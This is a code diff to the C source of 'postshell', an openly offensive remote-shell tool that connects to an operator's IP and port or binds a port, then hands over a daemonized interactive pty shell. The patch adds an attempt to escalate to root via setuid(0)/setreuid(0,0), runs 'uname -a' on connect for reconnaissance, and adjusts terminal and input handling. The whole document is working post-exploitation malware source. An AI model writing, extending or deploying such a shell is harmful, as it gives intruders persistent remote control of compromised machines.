@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <sys/prctl.h>
 #include <pty.h>
+#include <sys/types.h>
 #include <sys/ptrace.h>
 #include <stdbool.h>
 #include <sys/ioctl.h>
@@ -34,6 +35,10 @@ Y                                       Y                        Y
 https://github.com/rek7/postshell                      
 )EOF";
 
+void try_root(void) {
+    setuid(0);
+    setreuid(0, 0);
+}
 
 int create_conn(char* ip, int port)
 {
@@ -90,8 +95,8 @@ bool cleanup_tty(int socket, int master)
 
 bool open_term(int s0)
 {
-    fd_set comm;
-    int master, slave, pid; // master == pty, tty == slave
+    fd_set comm = { 0 };
+    int master=0, slave=0, pid=0; // master == pty, tty == slave
 
     if (open_pty(&master, &slave) && ttyname(slave) != NULL) {
         struct winsize ws = {0};
@@ -108,8 +113,16 @@ bool open_term(int s0)
         putenv("PS1=\\x1b[1;36m\\u@\\h:\\w\\$\\x1b[0m");
         putenv(("SHELL=%s", SHELL));
 
-        ws.ws_row = 150;
-        ws.ws_col = 150;
+        /*
+
+            Setting the terminal size
+
+        */
+
+        ws.ws_row = 80;
+        ws.ws_col = 20;
+        ws.ws_xpixel = 0;
+        ws.ws_ypixel = 0;
 
         if (ioctl(master, TIOCSWINSZ, &ws) != 0) { // send the config to the device XD
             #ifdef _DEBUG
@@ -149,11 +162,11 @@ bool open_term(int s0)
         }
         else { // master
             close(slave);
-            write(master, "stty -echo\r\n", 11); // removes duplicate commands being shown to the user
+            write(master, "stty -echo\n", 11); // removes duplicate commands being shown to the user
             send(s0, banner, strlen(banner), 0);
             usleep(1250000);
             tcflush(master, TCIOFLUSH);
-            write(master, "\r\n", 1);
+            write(master, "uname -a\n", 9);
             while (1) {
                 FD_ZERO(&comm);
                 FD_SET(s0, &comm);
@@ -176,12 +189,12 @@ bool open_term(int s0)
                 if (FD_ISSET(s0, &comm)) { // write command
                     recv(s0, message, sizeof(message), 0);
                     write(master, message, strlen(message));
-                    if (strcmp(message, "^C\r\n") == 0) //https://stackoverflow.com/questions/2195885/how-to-send-ctrl-c-control-character-or-terminal-hangup-message-to-child-process
+                    if (strcmp(message, "^C\r\n") == 0 || strcmp(message, "^C\n") == 0) //https://stackoverflow.com/questions/2195885/how-to-send-ctrl-c-control-character-or-terminal-hangup-message-to-child-process
                     {
                         char ctrl_c = 0x003;
                         write(master, &ctrl_c, 1); // kill dat hoe
                     }
-                    else if (strcmp(message, "exit\r\n") == 0) {
+                    else if (strcmp(message, "exit\r\n") == 0 || strcmp(message, "exit\n") == 0) {
                         char* bye_msg = "Exiting.\r\n";
                         send(s0, bye_msg, strlen(bye_msg), 0);
                         cleanup_tty(s0, master);
@@ -228,6 +241,7 @@ int main(int argc, char *argv[])
         }
         else {
             handle_sigs();
+            try_root(); // try to set guid/uid to 0 (root)
             if(!daemon(1, 0)) {
                 int s1 = 0;
                 if (argc == 2) // bindshell -- ./binary port
